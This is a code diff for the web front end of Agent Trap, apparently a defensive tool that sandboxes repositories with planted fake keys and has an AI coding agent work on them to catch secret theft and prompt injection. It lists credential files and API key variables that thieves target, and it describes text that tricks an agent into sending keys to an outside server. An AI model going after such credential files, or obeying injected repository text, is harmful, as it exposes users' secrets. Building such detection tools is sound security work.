-  <section id="tab-scan" role="tabpanel" hidden>
-    <div class="card" id="scan-card"></div>
+  </div>
+  <main>
     <div class="card" id="progress" hidden>
-      <h2>Progress</h2>
+      <h2 id="progress-title">Scanning…</h2>
+      <p class="elapsed" id="elapsed" aria-live="off"></p>
       <ul id="log"></ul>
       <div class="error-text" id="scan-error" role="alert"></div>
     </div>
-  </section>
-</main>
-<footer>The secrets shown here are fake bait planted by Agent Trap; nothing real was leaked.</footer>
+    <section class="block" id="wild-box" hidden>
+      <h2 class="block-title">Caught in the wild</h2>
+      <p class="block-sub">Real malicious packages from PyPI, run in the trap. Each one tried to send data to its owner's server; the trap caught it, and nothing reached the attacker.</p>
+      <div class="wild" id="wild"></div>
+    </section>
+    <h2 class="block-title" style="margin-bottom:20px">How it works</h2>
+    <div class="steps" id="steps"></div>
+    <div id="demos"></div>
+  </main>
+</section>
+
+<section id="tab-past" role="tabpanel" hidden>
+  <main>
+    <div class="grid">
+      <div class="card" id="list" aria-label="Past scans"></div>
+      <article id="detail"></article>
+    </div>
+  </main>
+</section>
+<footer>The keys you see in results are fake bait we planted. Nothing real is ever leaked.</footer>
 
 <script>
 "use strict";
@@ -142,6 +363,13 @@ function h(tag, props = {}, ...kids) {
 const $ = (id) => document.getElementById(id);
 const clear = (node) => { while (node.firstChild) node.removeChild(node.firstChild); };
 
+// A saved result: from the local server when it is running, else from the files a saved copy
+// of the page ships with (results/<id>.json).
+function getResult(id) {
+  const name = encodeURIComponent(id);
+  return state.live ? getJson(`api/results/${name}`) : getJson(`results/${name}.json`);
+}
+
 async function getJson(path) {
   try {
     const response = await fetch(path, { headers: { Accept: "application/json" } });
@@ -149,213 +377,561 @@ async function getJson(path) {
   } catch { return null; }
 }
 
-const state = { live: false, demos: [], limits: null, results: [], current: null, busy: false };
+// Inline icons, drawn here as fixed shapes (no data goes into them).
+const SVGNS = "http://www.w3.org/2000/svg";
+const ICONS = {
+  shield: [["path", { d: "M12 2.5 4 5.5v6c0 4.7 3.3 8.1 8 10 4.7-1.9 8-5.3 8-10v-6l-8-3z" }], ["path", { d: "M8.5 12l2.5 2.5 4.5-5" }]],
+  shieldX: [["path", { d: "M12 2.5 4 5.5v6c0 4.7 3.3 8.1 8 10 4.7-1.9 8-5.3 8-10v-6l-8-3z" }], ["path", { d: "M9.3 9.3l5.4 5.4M14.7 9.3l-5.4 5.4" }]],
+  warn: [["path", { d: "M12 3.5 2.8 19.5h18.4L12 3.5z" }], ["path", { d: "M12 10v4.3M12 17.2v.01" }]],
+  check: [["circle", { cx: 12, cy: 12, r: 9 }], ["path", { d: "M8 12.5l3 3 5-6" }]],
+  box: [["rect", { x: 4, y: 10.5, width: 16, height: 10.5, rx: 2.5 }], ["path", { d: "M8 10.5V7.5a4 4 0 0 1 8 0v3M12 14.5v3" }]],
+  agent: [["rect", { x: 4, y: 8, width: 16, height: 11, rx: 3.5 }], ["path", { d: "M12 4v4M9 13v.01M15 13v.01M2.5 12.5v2.5M21.5 12.5v2.5M9.5 16.2h5" }]],
+  target: [["circle", { cx: 10.5, cy: 10.5, r: 6.5 }], ["path", { d: "M20.5 20.5l-5.4-5.4M7.5 10.5h6" }]],
+  dot: [["circle", { cx: 8, cy: 8, r: 5, fill: "currentColor", stroke: "none" }]],
+};
+function icon(name, size = 20, width = 2) {
+  const svg = document.createElementNS(SVGNS, "svg");
+  for (const [k, v] of Object.entries({ viewBox: name === "dot" ? "0 0 16 16" : "0 0 24 24", width: size, height: size, fill: "none",
+    stroke: "currentColor", "stroke-width": width, "stroke-linecap": "round", "stroke-linejoin": "round", "aria-hidden": "true", class: "i" }))
+    svg.setAttribute(k, v);
+  for (const [tag, attrs] of ICONS[name]) {
+    const part = document.createElementNS(SVGNS, tag);
+    for (const [k, v] of Object.entries(attrs)) part.setAttribute(k, v);
+    svg.append(part);
+  }
+  return svg;
+}
+// HIJACKED is the stored value; people see MALICIOUS.
+const LABEL = (status) => (status === "HIJACKED" ? "MALICIOUS" : status);
+const VERDICT_ICON = { HIJACKED: "shieldX", SUSPICIOUS: "warn", SAFE: "check" };
+
+const state = { live: false, demos: [], limits: null, results: [], current: null, busy: false, timer: null };
 
 // ---- tabs --------------------------------------------------------------------------------------
 function showTab(name) {
-  for (const tab of ["results", "scan"]) {
+  for (const tab of ["scan", "past"]) {
     $(`tab-${tab}`).hidden = tab !== name;
     $(`tab-${tab}-btn`).setAttribute("aria-selected", String(tab === name));
   }
+  window.scrollTo(0, 0);
 }
-$("tab-results-btn").addEventListener("click", () => showTab("results"));
 $("tab-scan-btn").addEventListener("click", () => showTab("scan"));
+$("tab-past-btn").addEventListener("click", () => showTab("past"));
 
-// ---- saved results list -----------------------------------------------------------------------------
+// ---- past scans list ----------------------------------------------------------------------------------
 function when(iso) {
   const date = new Date(iso);
   return Number.isNaN(date.getTime()) ? "" : date.toLocaleString();
+}
+
+function relTime(iso) {
+  const date = new Date(iso);
+  if (Number.isNaN(date.getTime())) return "";
+  const minutes = Math.max(0, (Date.now() - date.getTime()) / 60000);
+  if (minutes < 1) return "just now";
+  if (minutes < 60) return `${Math.floor(minutes)} min ago`;
+  if (minutes < 1440) return `${Math.floor(minutes / 60)} h ago`;
+  if (minutes < 2880) return "yesterday";
+  return date.toLocaleDateString(undefined, { day: "numeric", month: "short", year: "numeric" });
 }
 
 function renderList() {
   const list = $("list");
   clear(list);
   if (!state.results.length) {
-    list.append(h("p", { class: "muted small", style: "padding:8px" },
-      state.live ? "No saved results yet. Scan a repository, or run agenttrap scan <repo>."
+    list.append(h("p", { class: "muted small empty" },
+      state.live ? "No past scans yet. Scan a repository to see it here."
                  : "No saved results in this copy of the page."));
     return;
   }
-  for (const item of state.results) {
-    list.append(h("button", {
-      class: "item", "aria-current": String(state.current === item.id),
+  list.append(h("div", { class: "list-head" }, h("h2", {}, "Past scans"), h("span", { class: "muted small" }, state.results.length)));
+  for (const [title, items] of groupedResults())
+    list.append(h("div", { class: "group-label" }, title), h("div", { class: "rows" }, items.map(rowFor)));
+}
+
+// Real malware we did not write is the strongest evidence, so it comes first; our own test
+// repositories come last. Within a group: MALICIOUS, then SUSPICIOUS, then SAFE, newest first.
+const GROUPS = ["Real malware from PyPI", "Public projects", "Our test repositories"];
+const SEVERITY = { HIJACKED: 0, SUSPICIOUS: 1, SAFE: 2 };
+
+function groupOf(name) {
+  const n = String(name || "");
+  if (n.startsWith("batch/")) return 0;
+  const ours = n.startsWith("p3Xxer/") || n === "malicious-repo-agent-trap"
+    || Object.keys(DEMO_LABELS).some((k) => k === n || k.endsWith(`/${n}`));
+  return ours ? 2 : 1;
+}
+
+function groupedResults() {
+  const sorted = [...state.results].sort((a, b) =>
+    groupOf(a.name) - groupOf(b.name)
+    || (SEVERITY[a.status] ?? 3) - (SEVERITY[b.status] ?? 3)
+    || String(b.created).localeCompare(String(a.created)));
+  return GROUPS.map((title, i) => [title, sorted.filter((r) => groupOf(r.name) === i)]).filter(([, items]) => items.length);
+}
+
+function rowFor(item) {
+  return h("button", {
+      class: "item", "aria-current": String(state.current === item.id), title: `${item.name} (${LABEL(item.status)})`,
       onclick: () => selectResult(item.id),
     },
-      h("span", { class: `badge ${item.status}` }, item.status),
-      h("span", { class: "name" }, item.name),
-      h("span", { class: "muted small" }, when(item.created))));
-  }
+      h("span", { class: `vi-${item.status}` }, icon(VERDICT_ICON[item.status] === "check" ? "check" : VERDICT_ICON[item.status] || "dot", 20)),
+      h("span", { class: "item-body" },
+        h("span", { class: "name" }, friendlyName(item.name)),
+        h("span", { class: "meta" }, relTime(item.created))));
 }
 
 async function selectResult(id) {
-  const doc = (await getJson(`api/results/${encodeURIComponent(id)}`))
-    || (await getJson(`results/${encodeURIComponent(id)}.json`));
+  const doc = await getResult(id);
   if (!doc) return;
   state.current = id;
   history.replaceState(null, "", `#${encodeURIComponent(id)}`);
   renderList();
   renderDetail(doc);
-  showTab("results");
+  showTab("past");
 }
 
-// ---- one result ---------------------------------------------------------------------------------------
-function chip(location) { return h("span", { class: "chip" }, `${location.file}:${location.line}`); }
+// ---- code view -------------------------------------------------------------------------------------------------
+const lineId = (file, line) => `code:${file}:${line}`;
+
+function jumpTo(file, line) {
+  const row = document.getElementById(lineId(file, line));
+  if (!row) return;
+  row.scrollIntoView({ block: "center", behavior: "smooth" });
+  row.focus({ preventScroll: true });
+  row.classList.remove("flash");
+  void row.offsetWidth;
+  row.classList.add("flash");
+}
+
+function lineLink(file, line) {
+  return h("button", { type: "button", class: "num", title: `Jump to line ${line}`, onclick: () => jumpTo(file, line) }, line);
+}
+
+// Older results kept the temporary folder a scan was unpacked into; it means nothing to a reader.
+const cleanPath = (path) => String(path)
+  .replace(/^(?:private\/)?(?:tmp|var\/folders\/[^/]+\/[^/]+\/T)\/tmp[^/]+\/(?:[^/]+\/)?/, "");
+// "batch/s3transfer-sl-0.12.5/s3transfer_sl-0.12.5" -> "s3transfer_sl-0.12.5"
+const displayName = (name) => String(name || "").replace(/^batch\//, "").split("/").slice(-1)[0] || String(name || "");
+// Our own test repositories are saved as "attacks/x" or just "x": show what they do instead.
+const friendlyName = (name) => {
+  const n = String(name || "");
+  const id = Object.keys(DEMO_LABELS).find((k) => k === n || k.endsWith(`/${n}`));
+  if (id) return `Test repo: ${DEMO_LABELS[id]}`;
+  return looksLikeRepo(n) ? n : displayName(n);
+};
+const looksLikeRepo = (name) => /^[\w.-]+\/[\w.-]+$/.test(String(name)) && !String(name).startsWith("batch/");
+
+function chip(location) { return h("span", { class: "chip" }, `${cleanPath(location.file)}:${location.line}`); }
 
 function codeBlock(file, excerpt, hits, related) {
   const rows = excerpt.lines.map((text, index) => {
     const number = excerpt.start + index;
     const kind = hits.has(number) ? "hit" : related.has(number) ? "rel" : "";
-    return h("div", { class: `line ${kind}` },
+    return h("div", { class: `line ${kind}`, id: lineId(file, number), tabindex: "-1" },
       h("span", { class: "no" }, number), h("span", { class: "src" }, text || " "));
   });
   const more = excerpt.start + excerpt.lines.length - 1 < excerpt.total_lines;
-  return h("div", { class: "code" }, h("div", { class: "file" }, file), rows,
-    more ? h("div", { class: "file small" }, "… rest of the file not shown") : null);
+  return h("div", { class: "code" }, h("div", { class: "code-inner" }, h("div", { class: "file" }, cleanPath(file)), rows,
+    more ? h("div", { class: "file small" }, "… rest of the file not shown") : null));
 }
 
 function linesOf(findings, file, key) {
   const lines = new Set();
-  for (const f of findings) for (const l of f[key]) if (l.file === file) lines.add(l.line);
+  for (const f of findings) for (const l of f[key] || []) if (l.file === file) lines.add(l.line);
   return lines;
 }
 
-const TAG_NOTES = {
-  "base64": "hidden as base64, so a text scanner sees only random characters",
-  "runtime-fetch": "a network call made by the repository's own code while it runs",
-  "unicode": "hidden with invisible unicode characters",
-  "agent-instruction": "an AI agent obeyed this text; on its own it was enough",
+// ---- wording ------------------------------------------------------------------------------------------------------
+const UNLOOKABLE = /\.(invalid|test|example|localhost)$/i;  // names no registry or search can know
+
+function listOf(items) {
+  if (items.length < 2) return items.join("");
+  return `${items.slice(0, -1).join(", ")} and ${items[items.length - 1]}`;
+}
+
+const prettySecret = (name) => String(name).replace(/^the (?:sandbox's )?fake\s+/i, "");
+
+// Canary names as older saved results wrote them, and how a person would say them.
+const PLAIN_SECRETS = {
+  "~/.aws/credentials": "AWS key", "~/.ssh/id_rsa": "SSH key", "~/.config/gh/hosts.yml": "GitHub token",
+  "~/.npmrc": "npm token", "$OPENAI_API_KEY": "OpenAI key", "$ANTHROPIC_API_KEY": "Anthropic key",
+  "$HOSTNAME": "machine name", "$USER": "user name",
 };
+
+// Old saved results have no leak_groups: rebuild one group per destination from the leak findings'
+// messages, so they read like new results instead of one sentence per secret.
+function leakGroups(doc) {
+  if (Array.isArray(doc.leak_groups)) return doc.leak_groups;
+  const groups = new Map();
+  for (const f of (doc.findings || []).filter((x) => x.rule === "agent-trap/secret-leak")) {
+    const text = String(f.message || "");
+    const secret = (text.match(/(?:secret|identity \()\s*(\$[A-Z_]+|~\/[^\s,)]+)/) || [])[1];
+    const destination = (text.match(/(?:sent to|sending [^.]*? to) (\S+?)\.(?:\s|$)/) || [])[1];
+    if (!secret || !destination) return (doc.findings || []).filter((x) => x.rule === "agent-trap/secret-leak")
+      .map((x) => ({ message: x.message, lines: x.locations || [] }));  // a message we cannot read
+    let host = destination;
+    try { host = new URL(destination).hostname; } catch { /* keep it as written */ }
+    const group = groups.get(host) || { destination_host: host, destination, secrets: [], lines: [], phase: "unknown", tricked: false };
+    if (/tricked by text/i.test(text)) group.tricked = true;
+    group.secrets.push(PLAIN_SECRETS[secret] || secret);
+    for (const l of f.locations || [])
+      if (!group.lines.some((x) => x.file === l.file && x.line === l.line)) group.lines.push(l);
+    groups.set(host, group);
+  }
+  return [...groups.values()];
+}
+
+// One plain sentence for everything sent to one destination.
+function leakSentence(group) {
+  if (!group.secrets || !group.phase) return group.message || "";
+  const files = [...new Set((group.lines || []).map((l) => l.file))];
+  const where = files.length ? listOf(files) : "the code";
+  const secrets = `your ${listOf(group.secrets.map(prettySecret))}`;
+  const host = group.destination_host || group.destination || "an outside server";
+  if (group.tricked) return `Text in ${where} tricks an AI agent into sending ${secrets} to ${host}.`;
+  // An AI agent that installs the repo sets off the same code, so that is still "when installed".
+  if (group.phase === "install" || group.phase === "both") return `When installed, ${where} sends ${secrets} to ${host}.`;
+  if (group.phase === "unknown") return `The code in ${where} sends ${secrets} to ${host}.`;
+  return `When an AI agent works on it, ${where} gets it to send ${secrets} to ${host}.`;
+}
+
+function shortPath(text) {
+  const at = String(text).indexOf(":");
+  const path = at < 0 ? String(text) : String(text).slice(0, at);
+  const rest = at < 0 ? "" : String(text).slice(at);
+  return cleanPath(path).split("/").slice(-2).join("/") + rest;
+}
+
+// up to three short reasons a SUSPICIOUS result is suspicious
+function reasons(doc) {
+  const out = [];
+  for (const flag of doc.flags || []) {
+    const detail = String(flag.detail || "");
+    let text = "";
+    if (flag.kind === "contacted-host") text = `It contacted ${detail.replace(/^sandbox contacted\s+/i, "")}`;
+    else if (flag.kind === "suspicious-code") text = `The AI agent flagged code in ${shortPath(detail.split(": ")[0])}`;
+    else if (flag.kind === "injection-reported") text = `Text aimed at the AI agent in ${shortPath(detail.split(": ")[0])}`;
+    if (text && !out.includes(text)) out.push(text);
+  }
+  return out.slice(0, 3);
+}
+
+function scanFacts(doc) {
+  const how = "Agent Trap installed the repo and ran its tests, then had an AI coding agent set it up, " +
+    "run its tests and summarize it, the way a developer would use one on new code.";
+  const s = Math.round(Number(doc.seconds) || 0);
+  const took = s < 90 ? `${s} seconds` : `${Math.round(s / 60)} minutes`;
+  return { how, meta: `${took} · AI cost $${Number(doc.cost_usd || 0).toFixed(3)} · ${when(doc.created)}` };
+}
+
+// "setup.py:1", "setup.py:8-26" -> "setup.py lines 1 and 8–26"
+function removedLines(removed) {
+  const byFile = new Map();
+  for (const item of removed || []) {
+    const at = String(item).lastIndexOf(":");
+    const file = at < 0 ? String(item) : String(item).slice(0, at);
+    const span = at < 0 ? "" : String(item).slice(at + 1).replace("-", "–");
+    if (!byFile.has(file)) byFile.set(file, []);
+    if (span) byFile.get(file).push(span);
+  }
+  return listOf([...byFile].map(([file, spans]) =>
+    spans.length ? `${file} line${spans.length > 1 || spans[0].includes("–") ? "s" : ""} ${listOf(spans)}` : file));
+}
+
+// Proof that the right code was found: it was deleted and the repo scanned again.
+function fixCheck(doc) {
+  if (!doc.cleaned) return null;
+  const fixed = !(doc.cleaned.rescan_leaks || []).length;
+  return h("p", { class: `fix-check ${fixed ? "good" : "bad"}` }, h("strong", {}, "Fix check: "),
+    `we deleted ${removedLines(doc.cleaned.removed)} and scanned again. `,
+    fixed ? "No key was stolen." : "Keys were still stolen, so the lines above are not the whole story.");
+}
+
+function splitWhere(where) {
+  const at = String(where).lastIndexOf(":");
+  return at < 0 ? { file: where, line: "" } : { file: where.slice(0, at), line: where.slice(at + 1) };
+}
+
+// ---- the result: verdict card ------------------------------------------------------------------------------------------
+const TITLES = { HIJACKED: "This repo steals secrets", SUSPICIOUS: "Something here looks risky", SAFE: "No theft found" };
+
+function verdictCard(doc, groups, findings) {
+  const body = h("div", { class: "v-body" });
+  body.append(h("h2", { class: "v-title" }, TITLES[doc.status] || doc.headline || "Result"));
+
+  const source = String(doc.source || "");
+  body.append(h("div", { class: "v-repo" },
+    /^https:\/\//i.test(source)
+      ? h("a", { class: "source", href: source, target: "_blank", rel: "noopener noreferrer" }, doc.name)
+      : h("span", { class: "repo-name" }, friendlyName(doc.name)),
+    h("span", { class: `badge ${doc.status}` }, LABEL(doc.status))));
+
+  if (groups.length) {
+    for (const g of groups) {
+      body.append(h("p", { class: "sentence" }, leakSentence(g)));
+      // the request the trap stopped: evidence, not an opinion
+      if (g.destination) body.append(h("p", { class: "caught" }, h("span", { class: "caught-label" }, "Caught in transit"),
+        h("code", {}, `${g.method && g.method !== "DNS" ? g.method + " " : g.method === "DNS" ? "DNS lookup " : ""}${g.destination}`)));
+    }
+    const sent = groups.flatMap((g) => g.secrets || []);
+    const identity = sent.some((x) => /machine name|user name/.test(x));
+    const keys = sent.some((x) => !/machine name|user name/.test(x));
+    const what = keys && identity ? "fake keys and a fake machine identity" : keys ? "fake keys" : "a fake machine identity";
+    body.append(h("p", { class: "note" }, `${keys ? "These were" : "This was"} ${what} we planted — nothing real was leaked.`));
+  } else if (doc.status === "SAFE") {
+    body.append(h("p", { class: "sentence" }, "We installed it, ran its tests and let an AI agent work on it. No planted key left the sandbox."));
+    const base = doc.baseline;
+    if (base && base.installed === false) body.append(h("p", { class: "note" }, "Note: it did not install in the sandbox, so less of its code ran."));
+    if (base && "tests" in base && !base.tests) body.append(h("p", { class: "note" }, "Note: its tests could not run in the sandbox."));
+  } else if (doc.status === "SUSPICIOUS") {
+    const why = reasons(doc);
+    body.append(h("p", { class: "sentence" }, `No key left the sandbox, but there are warning signs${why.length ? ":" : "."}`));
+    if (why.length) body.append(h("ul", {}, why.map((r) => h("li", {}, r))));
+  } else {
+    body.append(h("p", { class: "sentence" }, doc.headline || ""));
+  }
+  for (const f of findings.filter((x) => x.rule === "agent-trap/destructive-command"))
+    body.append(h("p", { class: "sentence" }, f.message));
+
+  const chips = [];
+  if (doc.status === "HIJACKED" && doc.static_scan && !doc.static_scan.count)
+    chips.push(h("span", { class: "tag", title: "A scanner that only reads the code found nothing here" }, "Code scanners would miss this"));
+  if (chips.length) body.append(h("div", { class: "chips" }, chips));
+
+  return h("div", { class: `card verdict v-${doc.status}` },
+    h("div", { class: `v-icon vi-${doc.status}` }, icon(VERDICT_ICON[doc.status] || "warn", 34, 1.8)), body);
+}
+
+// ---- the result: where it happens ----------------------------------------------------------------------------------------
+function whereCard(doc, groups, findings) {
+  // the leak's own lines, or else what the agent pointed at
+  const lineGroups = groups.some((g) => (g.lines || []).length) || doc.culprits_pending || !findings.length
+    ? groups : [{ lines: findings.flatMap((f) => f.locations || []) }];
+  const lines = lineGroups.flatMap((g) => g.lines || []);
+  const files = Object.entries(doc.files || {});
+  const box = h("div", { class: "lines-block" });
+
+  if (doc.culprits_pending && !lines.length)
+    box.append(h("div", { class: "pending" }, h("span", { class: "spin", "aria-hidden": "true" }), "Finding the exact lines…"));
+  for (const why of lineGroups.flatMap((g) => g.why_not || []))
+    box.append(h("p", { class: "muted small" }, `Could not pinpoint the line: ${why}`));
+  if (!lines.length && !lineGroups.some((g) => g.why_not))
+    for (const [secret, why] of Object.entries(doc.unlocalized || {}))
+      box.append(h("p", { class: "muted small" }, `Could not pinpoint the line for ${secret}: ${why}`));
+  if (!lines.length) return box.childNodes.length ? h("div", { class: "card" }, h("h2", { class: "section" }, "Where it happens"), box) : null;
+
+  const byFile = new Map();
+  for (const l of lines) {
+    if (!byFile.has(l.file)) byFile.set(l.file, new Set());
+    byFile.get(l.file).add(l.line);
+  }
+  // Red means proven: a key was seen leaving. Without a leak these are only the AI agent's opinion.
+  const proven = groups.length > 0;
+  const card = h("div", { class: "card" },
+    h("h2", { class: "section" }, proven ? "Where it happens" : "Code the AI agent flagged"),
+    h("div", { class: "legend" }, proven
+      ? h("span", {}, h("span", { class: "key hit" }), "these lines steal the secrets")
+      : h("span", {}, h("span", { class: "key rel" }), "flagged by the AI agent: a warning, not proof")));
+  for (const [file, numbers] of byFile)
+    card.append(h("div", { class: "file-row" }, h("span", { class: "filename" }, cleanPath(file)),
+      [...numbers].sort((a, b) => a - b).map((n) => lineLink(file, n))));
+  if (lineGroups.some((g) => g.unconfirmed))
+    card.append(h("p", { class: "muted small" }, "Likely lines: found by reading the code."));
+  if (doc.culprits_pending)
+    card.append(h("div", { class: "pending small" }, h("span", { class: "spin", "aria-hidden": "true" }), "Finding the exact lines…"));
+  // Red is proof: the lines of a leak. The AI agent's opinions are not coloured when a leak was
+  // proven, and a line that is a key line for any secret stays red.
+  const leaks = findings.filter((f) => f.rule === "agent-trap/secret-leak");
+  const coloured = leaks.length ? leaks : findings;
+  for (const [file, excerpt] of files) {
+    const hits = linesOf(coloured, file, "locations");
+    for (const g of lineGroups) for (const l of g.lines || []) if (l.file === file) hits.add(l.line);
+    card.append(proven ? codeBlock(file, excerpt, hits, new Set()) : codeBlock(file, excerpt, new Set(), hits));
+  }
+  const check = fixCheck(doc);
+  if (check) card.append(check);
+  return card;
+}
+
+// ---- the result: more details ---------------------------------------------------------------------------------------------
+function hostRows(doc) {
+  const rows = [];
+  for (const host of doc.contacted_hosts || []) {
+    if (UNLOOKABLE.test(host)) continue;
+    const info = (doc.host_intel || {})[host];
+    const parts = [];
+    if (info?.registered) parts.push(`domain registered ${registeredWhen(info.registered, info.age_days)}`);
+    if (info?.reports?.length) parts.push(`public reports: ${info.reports.map((r) => `${r.title} (${r.url})`).join("; ")}`);
+    if (parts.length) rows.push(h("li", {}, h("strong", {}, `Who is behind ${host}`), h("br"), parts.join(" · ")));
+  }
+  return rows;
+}
+
+function registeredWhen(date, days) {
+  const month = new Date(`${date}T00:00:00`).toLocaleDateString(undefined, { month: "long", year: "numeric" });
+  const n = Number(days);
+  const ago = !Number.isFinite(n) ? "" : n < 60 ? `${n} days ago` : n < 730 ? `${Math.round(n / 30)} months ago` : `${Math.round(n / 365)} years ago`;
+  return ago ? `in ${month} (${ago})` : `in ${month}`;
+}
+
+function detailsBlock(doc) {
+  const body = h("div", { class: "more-body" });
+
+  const noticed = [
+    ...(doc.injections || []).map((item) => h("li", {}, item.where ? chip(splitWhere(item.where)) : null,
+      ` — asks the AI agent to: ${item.asked_for}`)),
+    ...(doc.concerns || []).map((item) => h("li", {}, chip(splitWhere(item.where)), ` — ${item.behavior}`)),
+  ];
+  if (noticed.length)
+    body.append(h("h3", {}, "What the AI agent noticed"),
+      h("p", { class: "muted small" }, "Reported by the agent itself, so a warning and not proof."), h("ul", {}, noticed));
+
+  const hosts = hostRows(doc);
+  if (hosts.length) body.append(h("h3", {}, "Outside servers"), h("ul", {}, hosts));
+
+  const flagged = doc.static_scan?.count ?? 0;
+  if (doc.static_scan && flagged) {
+    body.append(h("h3", {}, "Code scanners"),
+      h("p", {}, flagged ? `A scanner that only reads the code flagged ${flagged} line${flagged === 1 ? "" : "s"}:`
+                          : "A scanner that only reads the code found nothing."),
+      (doc.static_scan.flagged || []).slice(0, 8).map((s) => h("div", {}, chip(s), h("span", { class: "small" }, ` ${s.text}`))));
+  }
+
+
+  const facts = scanFacts(doc);
+  body.append(h("h3", {}, "How the scan ran"), h("p", {}, facts.how),
+    h("p", { class: "muted small scan-meta" }, facts.meta));
+  return h("details", { class: "card more" },
+    h("summary", {}, h("span", { class: "chev", "aria-hidden": "true" }), "More details"), body);
+}
 
 function renderDetail(doc) {
   const out = $("detail");
   clear(out);
-
-  out.append(h("div", { class: "card banner" },
-    h("span", { class: `badge ${doc.status}` }, doc.status),
-    h("div", {}, h("div", { style: "font-weight:600" }, doc.name),
-      h("div", { class: "muted small" }, doc.headline)),
-    h("div", { class: "muted small", style: "margin-left:auto" },
-      `${doc.runs} runs · ${doc.seconds}s · $${Number(doc.cost_usd).toFixed(3)} · ${when(doc.created)}`)));
-
-  // what was found
   const findings = doc.findings || [];
-  const found = h("div", { class: "card" }, h("h2", {}, "What Agent Trap found"));
-  if (!findings.length) found.append(h("p", { class: "muted" }, "Nothing. No secret left the sandbox and no text tried to instruct the agent."));
-  for (const f of findings) {
-    found.append(h("div", { class: `finding ${f.level}` },
-      h("div", { class: "title" }, f.title), h("div", {}, f.message),
-      f.locations.map(chip)));
-  }
-  const notes = Object.values(doc.culprits || {}).flat().map((c) => TAG_NOTES[c.tag]).filter(Boolean);
-  for (const note of new Set(notes)) found.append(h("p", { class: "muted small" }, `Note: ${note}.`));
-  if (doc.culprits_pending)
-    found.append(h("p", { class: "muted small" }, "Still pinpointing the culprit lines; reload in a few minutes."));
-  for (const [secret, why] of Object.entries(doc.unlocalized || {}))
-    found.append(h("p", { class: "muted small" }, `Could not pinpoint the line for ${secret}: ${why}`));
-  out.append(found);
-
-  // the code
-  const files = Object.entries(doc.files || {});
-  if (files.length) {
-    const code = h("div", { class: "card" }, h("h2", {}, "Where"),
-      h("p", { class: "muted small" }, "Red lines are the ones to look at; yellow lines are also needed for it to happen."));
-    for (const [file, excerpt] of files)
-      code.append(codeBlock(file, excerpt, linesOf(findings, file, "locations"), linesOf(findings, file, "related")));
-    out.append(code);
-  }
-
-  // comparison with a plain read-through
-  const flagged = doc.static_scan?.count ?? 0;
-  const detected = doc.status !== "SAFE";
-  out.append(h("div", { class: "card" }, h("h2", {}, "Versus just reading the files"),
-    h("div", { class: "compare" },
-      h("div", {}, h("div", { class: "muted small" }, "A plain text scan flagged"),
-        h("div", { class: "big" }, `${flagged} line${flagged === 1 ? "" : "s"}`)),
-      h("div", {}, h("div", { class: "muted small" }, "Agent Trap, by running the repo"),
-        h("div", { class: `big ${doc.status}`, style: "background:none" }, detected ? `${findings.length} finding${findings.length === 1 ? "" : "s"}` : "nothing found"))),
-    flagged === 0 && detected ? h("p", { class: "small" }, "Reading the files showed nothing wrong here. The problem only appears when the code runs.") : null,
-    (doc.static_scan?.flagged || []).map((s) => h("div", {}, chip(s), h("span", { class: "small" }, ` ${s.text}`)))));
-
-  // agent-reported text
-  if ((doc.injections || []).length) {
-    const card = h("div", { class: "card" }, h("h2", {}, "Text that tried to instruct the AI agent"),
-      h("p", { class: "muted small" }, "Reported by the agent itself, so this is a warning, not proof."));
-    for (const item of doc.injections)
-      card.append(h("div", { class: "finding warning" },
-        item.where ? chip({ file: item.where, line: "" }) : h("span", { class: "muted small" }, "quoted text not found in the repository"),
-        h("div", { class: "quote" }, item.quote), h("div", { class: "small" }, `Asked for: ${item.asked_for}`)));
-    out.append(card);
-  }
-
-  // code the agent called suspicious
-  if ((doc.concerns || []).length) {
-    const card = h("div", { class: "card" }, h("h2", {}, "Code the AI agent found suspicious"),
-      h("p", { class: "muted small" }, "The agent's opinion, so a warning and not proof. Each quoted line was found in the repository."));
-    for (const item of doc.concerns)
-      card.append(h("div", { class: "finding warning" }, chip({ file: item.where, line: "" }),
-        item.quote ? h("div", { class: "quote" }, item.quote) : null,
-        h("div", { class: "small" }, `It does: ${item.behavior}`)));
-    out.append(card);
-  }
-
-  // hosts
-  const hosts = doc.contacted_hosts || [];
-  if (hosts.length) {
-    const table = h("table", {}, h("tr", {}, ["Host", "Registered", "Public reports"].map((t) => h("th", {}, t))));
-    for (const host of hosts) {
-      const info = (doc.host_intel || {})[host];
-      const reports = !info || info.reports == null ? "unknown (search did not run)"
-        : info.reports.length ? info.reports.map((r) => `${r.title} (${r.url})`).join("; ") : "none found";
-      const registered = info?.registered ? `${info.registered} (${info.age_days} days ago)` : "unknown";
-      table.append(h("tr", {}, h("td", {}, host), h("td", {}, registered), h("td", {}, reports)));
-    }
-    out.append(h("div", { class: "card" }, h("h2", {}, "Hosts the sandbox contacted"),
-      h("p", { class: "muted small" }, "These are not on the allow-list. A recent registration or a web report is context, not proof."), table));
-  }
-
-  // cleaned copy
-  if (doc.cleaned) {
-    const c = doc.cleaned;
-    out.append(h("div", { class: "card" }, h("h2", {}, "Cleaned copy"),
-      h("p", {}, "Removed: ", c.removed.map((r) => h("span", { class: "chip" }, r))),
-      h("p", {}, "Scanned again: ", h("span", { class: `badge ${c.rescan_status}` }, c.rescan_status),
-        c.rescan_leaks.length ? ` still leaks ${c.rescan_leaks.join(", ")}` : " the secret no longer leaves the sandbox"),
-      c.warnings.map((w) => h("p", { class: "small", style: "color:var(--amber)" }, w)),
-      h("p", { class: "muted small" }, "Removing code can change what the repository does. Review it before use.")));
-  }
+  const groups = leakGroups(doc);
+  out.append(verdictCard(doc, groups, findings));
+  const where = whereCard(doc, groups, findings);
+  if (where) out.append(where);
+  out.append(detailsBlock(doc));
 }
 
-// ---- live scanning ------------------------------------------------------------------------------------------
-function renderScanCard() {
-  const card = $("scan-card");
-  clear(card);
+// ---- scan view ---------------------------------------------------------------------------------------------------------------
+const STEPS = [
+  ["box", "Locked sandbox", "The repo runs in a sealed container with no internet. Fake AWS, GitHub and AI keys are planted where thieves look."],
+  ["agent", "An AI agent works on it", "Like a developer would: install it, run the tests, read the docs. Hidden instructions get their chance to trick it."],
+  ["target", "Caught, line by line", "If a fake key tries to leave, we catch it and show the exact lines responsible."],
+];
+
+function renderStatic() {
+  $("brand").append(icon("shield", 24, 2), "Agent Trap");
+  $("steps").append(...STEPS.map(([name, title, text], index) => h("div", { class: "card step" },
+    h("div", { class: "step-top" }, h("span", { class: "step-icon" }, icon(name, 24, 1.8)), h("span", { class: "step-num" }, `0${index + 1}`)),
+    h("h3", {}, title), h("p", {}, text))));
+}
+
+// What each of our test repositories does, in words a visitor understands.
+const DEMO_LABELS = {
